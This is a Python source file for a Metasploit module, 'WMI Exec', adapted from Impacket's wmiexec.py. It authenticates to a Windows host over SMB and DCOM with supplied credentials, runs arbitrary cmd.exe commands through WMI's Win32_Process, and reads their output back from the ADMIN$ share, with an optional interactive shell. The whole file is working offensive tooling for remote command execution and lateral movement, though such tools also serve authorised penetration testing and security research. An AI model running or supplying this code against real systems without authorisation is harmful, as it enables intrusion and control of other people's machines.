#!/usr/bin/env python
# Copyright (c) 2003-2018 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#

import logging
import os
import string
import sys

try:
    from impacket.smbconnection import SMBConnection, SMB_DIALECT, \
        SMB2_DIALECT_002, SMB2_DIALECT_21
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dtypes import NULL
except ImportError:
    dependencies_missing = True
else:
    dependencies_missing = False

import _msf_impacket
import metasploit.module as module

metadata = {
    'name': 'WMI Exec',
    'description': '''
        A similar approach to psexec but executing commands through WMI.
     ''',
    'authors': ['beto', 'Spencer McIntyre'],
    'date': '2018-03-19',
    'license': 'CORE_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py'}
     ],
    'type': 'single_scanner',
    'options': {
        'COMMAND':    {'type': 'string', 'description': 'The command to execute', 'required': True},
        'OUTPUT':     {'type': 'bool',   'description': 'Get the output of the executed command', 'required': True, 'default': True},
        'SMBDomain':  {'type': 'string', 'description': 'The Windows domain to use for authentication', 'required': False, 'default': '.'},
        'SMBPass':    {'type': 'string', 'description': 'The password for the specified username', 'required': True, 'default': None},
        'SMBUser':    {'type': 'string', 'description': 'The username to authenticate as', 'required': True, 'default': None},
    },
    'notes': {
        'AKA': ['wmiexec.py']
    }
}


class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, share=None,
                 noOutput=False):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = False
        self.__kdcHost = None
        self.shell = None

    def run(self, addr):
        if self.__noOutput is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process,_ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection)
            if self.__command != ' ':
                self.shell.onecmd(self.__command)
            else:
                self.shell.cmdloop()
        except (Exception, KeyboardInterrupt), e:
            logging.error(str(e))

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()


class RemoteShell(_msf_impacket.RemoteShell):
    def __init__(self, share, win32Process, smbConnection):
        self.__win32Process = win32Process
        self._pwd = 'C:\\'
        self._shell = 'cmd.exe /Q /c '
        super(RemoteShell, self).__init__(share, smbConnection)

    def execute_remote(self, data):
        command = self._shell + data 
        if self._noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output  + ' 2>&1'
        self.__win32Process.Create(command.decode('utf-8'), self._pwd, None)
        self.get_output()


def run(args):
    if dependencies_missing:
        module.log('Module dependencies (impacket) missing, cannot continue', level='error')
        return

    _msf_impacket.pre_run_hook(args)
    executer = WMIEXEC(args['COMMAND'], args['SMBUser'], args['SMBPass'], args['SMBDomain'], 
                        share='ADMIN$', noOutput=args['OUTPUT'] != 'true')
    executer.run(args['rhost'])

if __name__ == "__main__":
    module.run(metadata, run)
